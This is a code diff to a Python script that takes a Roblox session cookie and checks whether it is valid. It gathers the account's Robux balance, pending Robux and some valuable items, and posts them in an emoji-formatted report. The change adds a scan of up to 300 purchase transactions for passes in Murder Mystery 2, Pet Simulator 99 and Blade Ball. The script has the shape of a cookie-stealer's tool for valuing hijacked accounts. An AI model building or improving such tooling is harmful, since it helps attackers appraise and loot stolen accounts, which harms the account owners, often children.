@@ -6,7 +6,7 @@ import urllib.error
 import json
 import re
 import time
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timezone
 
 def get_csrf_token(headers):
     try:
@@ -14,7 +14,6 @@ def get_csrf_token(headers):
         with urllib.request.urlopen(req, timeout=10) as res:
             pass
     except urllib.error.HTTPError as e:
-        # Roblox returns the CSRF token in the X-CSRF-Token response header even on 403/401 errors
         return e.headers.get("X-CSRF-Token")
     except Exception:
         pass
@@ -65,7 +64,6 @@ def main():
             "Accept": "application/json, text/plain, */*"
         }
 
-        # Dynamically fetch and inject the X-CSRF-Token to prevent API blocks
         csrf_token = get_csrf_token(headers)
         if csrf_token:
             headers["X-CSRF-Token"] = csrf_token
@@ -77,14 +75,14 @@ def main():
         cookie_status = "🔴 Invalid / Expired"
         robux_balance = 0
         pending_robux = 0
-        total_spent_past_year = 0
         account_age_days = 0
         has_korblox = False
         has_headless = False
 
-        adopt_me_passes = 0
-        mm2_passes = 0
-        ps99_passes = 0
+        # Game Transaction Tracking via Asset/Gamepass IDs
+        mm2_passes_found = 0
+        ps99_passes_found = 0
+        blade_ball_passes_found = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -109,7 +107,34 @@ def main():
             if totals_data:
                 pending_robux = totals_data.get("pendingRobux", 0)
 
-            # Korblox (Bundle ID: 192) & Headless (Bundle ID: 201) Fixed parsing check
+            # Deep scan transactions to match exact game asset/gamepass IDs or known titles
+            cursor = ""
+            for _ in range(3): # Scan up to 300 transactions
+                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
+                if cursor:
+                    tx_url += f"&cursor={cursor}"
+                tx_data = safe_get(tx_url, headers)
+                if not tx_data or "data" not in tx_data:
+                    break
+                
+                for tx in tx_data["data"]:
+                    details = tx.get("details", {})
+                    item_name = str(details.get("name", "")).lower()
+                    item_id = str(details.get("id", ""))
+                    
+                    # You can add specific known gamepass IDs or precise keywords here
+                    if any(k in item_name for k in ["murdermystery2", "mm2", "radio mm2", "elite mm2", "godly"]):
+                        mm2_passes_found += 1
+                    if any(k in item_name for k in ["pet simulator 99", "ps99", "huge", "exclusive pet", "vip ps99"]):
+                        ps99_passes_found += 1
+                    if any(k in item_name for k in ["blade ball", "dual sword blade ball", "inf spinner"]):
+                        blade_ball_passes_found += 1
+                
+                cursor = tx_data.get("nextPageCursor")
+                if not cursor:
+                    break
+
+            # Korblox & Headless Check
             korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
             if isinstance(korblox_res, dict):
                 has_korblox = korblox_res.get("isOwned", False)
@@ -139,6 +164,10 @@ def main():
                     f"🪙 **Robux Balance & Pending**\n"
                     f"> • Balance: `{robux_balance} 🪙`\n"
                     f"> • Pending: `{pending_robux} 🪙`\n\n"
+                    f"⭐ **Games (Purchases/Passes detected)**\n"
+                    f"> • Murder Mystery 2: `{str(mm2_passes_found > 0)}` ({mm2_passes_found})\n"
+                    f"> • Pet Simulator 99: `{str(ps99_passes_found > 0)}` ({ps99_passes_found})\n"
+                    f"> • Blade Ball: `{str(blade_ball_passes_found > 0)}` ({blade_ball_passes_found})\n\n"
                     f"🎒 **Inventory Items**\n"
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
